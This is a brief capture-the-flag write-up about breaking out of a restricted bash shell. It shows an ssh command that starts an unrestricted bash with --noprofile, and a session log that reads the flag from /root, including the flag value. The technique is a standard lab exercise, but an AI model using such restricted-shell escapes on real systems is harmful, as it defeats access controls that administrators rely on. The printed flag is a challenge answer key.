The task is to break out of an RBASH and find the flag.
Trying standard commands resulted in failure and nothing was allowed.

Following this presentation: https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=9
I broke out after trying Step 4, by issuing a command prior to establishing a
shell
	ssh ctf@138.247.13.108 -t "bash --noprofile"

Then finding the flag was harder as the server does not have locate, but it was
located in plaintext in the root directory.
	
```python
jollyjackson@jollyjackson-laptop:~/Downloads$ ssh ctf@138.247.13.108 -t "bash --noprofile"
ctf@502b04eba365:~$ cd root^C
ctf@502b04eba365:~$ cd /root/
ctf@502b04eba365:/root$ cat flag.txt 
MCA{ieHaisoh4eif2ae}
ctf@502b04eba365:/root$ 
```
